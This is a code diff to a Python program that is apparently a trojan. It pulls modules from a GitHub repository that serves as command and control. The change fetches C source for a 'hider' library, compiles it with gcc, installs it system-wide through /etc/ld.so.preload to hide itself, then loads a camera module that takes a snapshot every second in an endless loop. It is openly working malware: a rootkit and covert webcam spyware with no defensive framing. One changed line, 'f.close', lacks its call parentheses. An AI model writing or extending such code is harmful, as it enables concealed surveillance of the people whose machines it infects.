@@ -4,7 +4,7 @@ import imp
 import sys
 import base64
 import time
-
+import os
 from github3 import login
 
 def connect_to_github() :
@@ -39,16 +39,18 @@ def store_module_result() :
 
 
 def hide():
-	hider = get_file_contents("modules/hider.so)
-	f = open("/usr/local/lib/hider.so", "w")
+	hider = get_file_contents("modules/hider.c")
+	f = open("hider.c","w")
 	f.write(hider)
-	f.close()
+	f.close
+	os.system("gcc -Wall -fPIC -shared -o hider.so hider.c -ldl")
+	os.rename("hider.so","/usr/local/lib/hider.so")
 	ff = open("/etc/ld.so.preload","w")
 	ff.write("/usr/local/lib/hider.so")
 	ff.close()
 
-camera = load_module("cam")
-
+hide()
+cam = load_module("cam")
 while True:
 	cam.snap()
 	time.sleep(1)
